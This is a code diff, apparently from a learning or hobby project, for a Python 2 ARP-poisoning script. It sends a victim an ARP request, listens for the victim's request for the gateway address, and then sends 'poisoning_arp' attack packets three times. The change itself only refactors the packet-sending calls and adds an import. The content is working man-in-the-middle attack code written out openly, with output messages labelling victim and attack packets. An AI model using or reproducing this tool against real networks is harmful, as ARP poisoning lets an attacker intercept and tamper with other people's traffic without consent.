@@ -3,6 +3,7 @@ import string
 import struct
 import pcap
 import netifaces
+from packets import *
 
 
 def main():
@@ -25,7 +26,7 @@ def main():
     pcap_handle.setfilter('arp')
 
     asking_arp = normal_request_arp(my_mac, my_ip, victim_ip)
-    asking_arp.send(pcap_handle)
+    pcap_handle.sendpacket(asking_arp.as_bytes())
     print '[<+] Sent victim({0}) a ARP request'.format(victim_ip)
 
     # wait for victim's response
@@ -64,9 +65,10 @@ def main():
             continue
         if arp.target_protocol_address != gateway_ip:
             continue
-        print "[>+] Victim sent ARP request for ip '{}'".format(gateway_ip)
+        print "[>+] Received victim's request for ip '{}'".format(gateway_ip)
+
         for i in xrange(3):
-            poisoning_arp.send(pcap_handle)
+            pcap_handle.sendpacket(poisoning_arp.as_bytes())
             print '[<+] Sent victim attack packet ({})'.format(i)
 
 
